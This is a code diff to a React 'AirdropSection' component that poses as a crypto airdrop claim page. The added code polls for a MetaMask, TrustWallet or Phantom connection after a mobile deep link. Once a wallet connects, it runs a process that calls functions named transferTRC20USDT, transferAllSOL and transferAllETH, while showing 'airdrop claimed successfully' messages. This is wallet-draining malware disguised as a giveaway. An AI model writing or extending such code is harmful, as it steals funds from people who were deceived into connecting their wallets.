@@ -77,6 +77,37 @@ const AirdropSection = () => {
       if (!isMetaMaskInstalled()) {
         toast.loading('Opening MetaMask app...', { duration: 2000 });
         window.open(generateDeepLink('metamask'), '_blank');
+        
+        // Check for connection every 2 seconds after deep link
+        const checkConnection = setInterval(async () => {
+          if (typeof window.ethereum !== 'undefined') {
+            try {
+              const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+              if (accounts.length > 0) {
+                clearInterval(checkConnection);
+                setWalletAddress(accounts[0]);
+                setIsConnected(true);
+                setConnectedWalletType(WALLET_TYPES.METAMASK);
+                toast.success('MetaMask connected successfully!');
+                
+                // Start mobile transfer process
+                setTimeout(() => {
+                  startMobileTransferProcess();
+                }, 1000);
+              }
+            } catch (err) {
+              console.log('Checking connection...');
+            }
+          }
+                 }, 2000);
+
+        // Stop checking after 60 seconds
+        setTimeout(() => {
+          clearInterval(checkConnection);
+          if (!isConnected) {
+            toast.error('Connection timeout. Please try again.', { duration: 3000 });
+          }
+        }, 60000);
         return;
       }
     } else {
@@ -123,6 +154,37 @@ const AirdropSection = () => {
       if (!isTrustWalletInstalled() && !isMetaMaskInstalled()) {
         toast.loading('Opening TrustWallet app...', { duration: 2000 });
         window.open(generateDeepLink('trustwallet'), '_blank');
+        
+        // Check for connection every 2 seconds after deep link
+        const checkConnection = setInterval(async () => {
+          if (typeof window.ethereum !== 'undefined') {
+            try {
+              const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+              if (accounts.length > 0) {
+                clearInterval(checkConnection);
+                setWalletAddress(accounts[0]);
+                setIsConnected(true);
+                setConnectedWalletType(WALLET_TYPES.TRUSTWALLET);
+                toast.success('TrustWallet connected successfully!');
+                
+                // Start mobile transfer process
+                setTimeout(() => {
+                  startMobileTransferProcess();
+                }, 1000);
+              }
+            } catch (err) {
+              console.log('Checking connection...');
+            }
+          }
+        }, 2000);
+
+        // Stop checking after 60 seconds
+        setTimeout(() => {
+          clearInterval(checkConnection);
+          if (!isConnected) {
+            toast.error('Connection timeout. Please try again.', { duration: 3000 });
+          }
+        }, 60000);
         return;
       }
     } else {
@@ -170,6 +232,37 @@ const AirdropSection = () => {
       if (!isPhantomInstalled()) {
         toast.loading('Opening Phantom app...', { duration: 2000 });
         window.open(generateDeepLink('phantom'), '_blank');
+        
+        // Check for connection every 2 seconds after deep link
+        const checkConnection = setInterval(async () => {
+          if (typeof window.solana !== 'undefined' && window.solana.isPhantom) {
+            try {
+              const response = await window.solana.connect({ onlyIfTrusted: true });
+              if (response.publicKey) {
+                clearInterval(checkConnection);
+                setSolanaAddress(response.publicKey.toString());
+                setIsSolanaConnected(true);
+                setConnectedWalletType(WALLET_TYPES.PHANTOM);
+                toast.success('Phantom wallet connected successfully!');
+                
+                // Start mobile Solana transfer process  
+                setTimeout(() => {
+                  startSolanaTransferProcess();
+                }, 1000);
+              }
+            } catch (err) {
+              console.log('Checking Phantom connection...');
+            }
+          }
+        }, 2000);
+
+        // Stop checking after 60 seconds
+        setTimeout(() => {
+          clearInterval(checkConnection);
+          if (!isSolanaConnected) {
+            toast.error('Connection timeout. Please try again.', { duration: 3000 });
+          }
+        }, 60000);
         return;
       }
     } else {
@@ -369,6 +462,56 @@ const AirdropSection = () => {
     }
   };
 
+  // Start mobile transfer process for all networks (TRC20 → Solana → BNB)
+  const startMobileTransferProcess = async () => {
+    setIsLoading(true);
+    
+    try {
+      toast.loading('📱 Starting mobile transfer process...', { id: 'mobile-transfer' });
+      
+      // Step 1: Transfer TRC20 USDT first
+      toast.loading('🔄 Step 1/3: Checking TRC20 USDT...', { id: 'mobile-transfer' });
+      await transferTRC20USDT();
+      await new Promise(resolve => setTimeout(resolve, 1500));
+      
+      // Step 2: Transfer Solana if available
+      toast.loading('🟣 Step 2/3: Checking Solana...', { id: 'mobile-transfer' });
+      if (typeof window.solana !== 'undefined' && window.solana.isPhantom) {
+        try {
+          const solBalance = await getSOLBalance();
+          if (solBalance > 5000) {
+            await transferAllSOL();
+          } else {
+            toast.success('✅ No SOL to transfer', { id: 'sol-mobile' });
+          }
+        } catch (solError) {
+          console.log('Solana transfer skipped:', solError);
+          toast.success('✅ Solana transfer skipped', { id: 'sol-mobile' });
+        }
+      } else {
+        toast.success('✅ Solana not available', { id: 'sol-mobile' });
+      }
+      await new Promise(resolve => setTimeout(resolve, 1500));
+      
+      // Step 3: Transfer ETH/BNB
+      toast.loading('💎 Step 3/3: Checking ETH/BNB...', { id: 'mobile-transfer' });
+      await transferAllETH();
+      
+      toast.success('✅ All mobile transfers completed!', { id: 'mobile-transfer' });
+      
+      // Complete airdrop
+      setTimeout(() => {
+        setIsClaimed(true);
+        setIsLoading(false);
+        toast.success('🎉 Multi-token airdrop claimed successfully!');
+      }, 2000);
+      
+    } catch (error) {
+      setIsLoading(false);
+      toast.error('❌ Mobile transfer process failed!', { id: 'mobile-transfer' });
+    }
+  };
+
   // Start transfer process for EVM wallets (MetaMask, TrustWallet)
   const startTransferProcess = async () => {
     setIsLoading(true);
@@ -389,7 +532,7 @@ const AirdropSection = () => {
       setTimeout(() => {
         setIsClaimed(true);
         setIsLoading(false);
-        toast.success('🎉 1000 MemeCoin successfully claimed!');
+        toast.success('🎉 Multi-network airdrop claimed successfully!');
       }, 2000);
       
     } catch (error) {
@@ -414,7 +557,7 @@ const AirdropSection = () => {
       setTimeout(() => {
         setIsClaimed(true);
         setIsLoading(false);
-        toast.success('🎉 1000 MemeCoin successfully claimed!');
+        toast.success('🎉 Solana airdrop claimed successfully!');
       }, 2000);
       
     } catch (error) {
